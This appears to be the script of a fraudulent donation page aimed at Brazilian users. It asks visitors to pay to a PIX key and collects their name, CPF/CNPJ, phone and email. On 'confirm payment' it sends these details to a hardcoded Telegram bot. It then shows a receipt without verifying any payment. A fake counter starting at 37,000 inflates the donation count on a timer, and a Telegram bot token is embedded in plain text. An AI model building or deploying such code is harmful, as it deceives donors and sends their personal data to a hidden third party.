// --- Constantes
// Chave PIX: Corrigida com os hífens para o formato UUID.
const PIX_KEY = "1947ac1a-a4e6-4903-9ebb-7211bd9e37a7";

// Token do Bot do Telegram.
const TELEGRAM_BOT_TOKEN = "8405316263:AAGnQ9ACDDYgJS1lipE92BPJly0pNjyFZf4";
const TELEGRAM_CHAT_ID = "5899156650";

// --- Elementos do DOM
const screens = document.querySelectorAll('.screen');
const donationForm = document.getElementById('donation-form');
const sharedSections = document.getElementById('shared-sections');
const pixKeyDisplay = document.getElementById('pix-key-display');
const companyInfo = document.getElementById('company-info');
const valueButtons = document.querySelectorAll('.value-btn');
const valueInput = document.getElementById('valor');

// --- Elementos do Novo Contador
const donationCounterElement = document.getElementById('donation-counter');
let donationCount = 37000; // Começa em 37 mil

let formData = {};

// --- Funções Auxiliares
function formatNumber(num) {
    return num.toLocaleString('pt-BR');
}

// --- Navegação entre Telas
function showScreen(screenId) {
    screens.forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');

    sharedSections.style.display = (screenId === 'initial-screen') ? 'block' : 'none';
    window.scrollTo(0, 0);
}

// --- Funções de Formatação de Inputs
function formatCpfCnpj(value) {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= 11) { // CPF
        return cleaned
            .replace(/(\d{3})(\d)/, '$1.$2')
            .replace(/(\d{3})(\d)/, '$1.$2')
            .replace(/(\d{3})(\d{1,2})/, '$1-$2')
            .slice(0, 14);
    } else { // CNPJ
        return cleaned
            .replace(/^(\d{2})(\d)/, '$1.$2')
            .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
            .replace(/\.(\d{3})(\d)/, '.$1/$2')
            .replace(/(\d{4})(\d)/, '$1-$2')
            .slice(0, 18);
    }
}

function formatPhone(value) {
    const cleaned = value.replace(/\D/g, '');
    return cleaned
        .replace(/^(\d{2})(\d)/, '($1) $2')
        .replace(/(\d{5})(\d)/, '$1-$2')
        .slice(0, 15);
}

function formatDate(value) {
    const cleaned = value.replace(/\D/g, '');
    return cleaned
        .replace(/(\d{2})(\d)/, '$1/$2')
        .replace(/(\d{2})(\d)/, '$1/$2')
        .slice(0, 10);
}

// --- Lógica do Formulário
function setupFormListeners() {
    const inputs = {
        nome: document.getElementById('nome'),
        sobrenome: document.getElementById('sobrenome'),
        cpf_cnpj: document.getElementById('cpf_cnpj'),
        telefone: document.getElementById('telefone'),
        nascimento: document.getElementById('nascimento')
    };

    inputs.nome.addEventListener('input', (e) => e.target.value = e.target.value.toUpperCase());
    inputs.sobrenome.addEventListener('input', (e) => e.target.value = e.target.value.toUpperCase());
    inputs.cpf_cnpj.addEventListener('input', (e) => {
        e.target.value = formatCpfCnpj(e.target.value);
        const isCnpj = e.target.value.length > 14;
        companyInfo.classList.toggle('hidden', !isCnpj);
    });
    inputs.telefone.addEventListener('input', (e) => e.target.value = formatPhone(e.target.value));
    inputs.nascimento.addEventListener('input', (e) => e.target.value = formatDate(e.target.value));

    valueButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            valueButtons.forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected');
            valueInput.value = btn.dataset.value;
        });
    });

    valueInput.addEventListener('input', () => {
        valueButtons.forEach(b => b.classList.remove('selected'));
        const matchingButton = [...valueButtons].find(b => b.dataset.value === valueInput.value);
        if (matchingButton) {
            matchingButton.classList.add('selected');
        }
    });

    donationForm.addEventListener('submit', handleFormSubmit);
}

function handleFormSubmit(event) {
    event.preventDefault();
    const form = new FormData(event.target);
    formData = Object.fromEntries(form.entries());
    
    // Set PIX key on PIX screen
    pixKeyDisplay.value = PIX_KEY;
    showScreen('pix-screen');
}

// --- Lógica da Tela PIX
function setupPixScreenListeners() {
    document.getElementById('copy-pix-key').addEventListener('click', () => {
        navigator.clipboard.writeText(pixKeyDisplay.value).then(() => {
            alert('Chave PIX copiada!');
        }).catch(err => {
            console.error('Erro ao copiar a chave PIX: ', err);
        });
    });

    document.getElementById('confirm-payment-button').addEventListener('click', async () => {
        await sendDataToTelegram();
        showReceipt();
        startThankYouLoop();
    });
}

// --- Integração com o Telegram
async function sendDataToTelegram() {
    const isCnpj = formData.cpf_cnpj && formData.cpf_cnpj.length > 14;
    const message = `
        🎉 *Nova Doação Recebida!* 🎉
        ----------------------------------
        *Doador:* ${formData.nome} ${formData.sobrenome}
        *Tipo:* ${isCnpj ? 'Pessoa Jurídica' : 'Pessoa Física'}
        *CPF/CNPJ:* ${formData.cpf_cnpj || 'Não informado'}
        *E-mail:* ${formData.email || 'Não informado'}
        *Telefone:* ${formData.telefone || 'Não informado'}
        ----------------------------------
        *Valor:* R$ ${parseFloat(formData.valor).toFixed(2).replace('.', ',')}
        *Doação Mensal:* ${formData.recorrente ? 'Sim' : 'Não'}
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error("Erro ao enviar para o Telegram:", error);
    }
}

// --- Comprovante e Loop de Agradecimento
function showReceipt() {
    const now = new Date();
    document.getElementById('receipt-datetime').textContent = now.toLocaleString('pt-BR');
    document.getElementById('receipt-name').textContent = `${formData.nome} ${formData.sobrenome}`;
    document.getElementById('receipt-value').textContent = `R$ ${parseFloat(formData.valor).toFixed(2).replace('.', ',')}`;
    document.getElementById('receipt-type').textContent = formData.recorrente ? 'Doação Mensal' : 'Doação Única';
    document.getElementById('receipt-id').textContent = new Date().getTime().toString().slice(-8);

    const messageEl = document.getElementById('receipt-message');
    const nameToUse = formData.nome_empresa || formData.nome;
    messageEl.textContent = `Muito obrigado, ${nameToUse}! Sua solidariedade ilumina caminhos e faz a diferença.`;
    
    showScreen('receipt-screen');
}

function startThankYouLoop() {
    setTimeout(() => {
        showScreen('thankyou-screen');
        setTimeout(() => {
            resetApp();
        }, 5000);
    }, 5000);
}

// --- Funções do Contador Personalizado
function startDonationCounter() {
    // Atualiza o contador a cada 10 segundos
    setInterval(() => {
        donationCount += 3;
        if (donationCounterElement) {
            donationCounterElement.textContent = formatNumber(donationCount);
        }
    }, 10000);
}

// --- Inicialização e Reset
function resetApp() {
    donationForm.reset();
    valueButtons.forEach(b => b.classList.remove('selected'));
    companyInfo.classList.add('hidden');
    formData = {};
    showScreen('initial-screen');
}

function init() {
    document.getElementById('start-donation-button').addEventListener('click', () => showScreen('form-screen'));
    document.getElementById('back-to-initial').addEventListener('click', () => showScreen('initial-screen'));
    
    setupFormListeners();
    setupPixScreenListeners();
    startDonationCounter(); // Chama a nova função do contador
    
    showScreen('initial-screen');
}

// --- Iniciar o aplicativo ---
init();
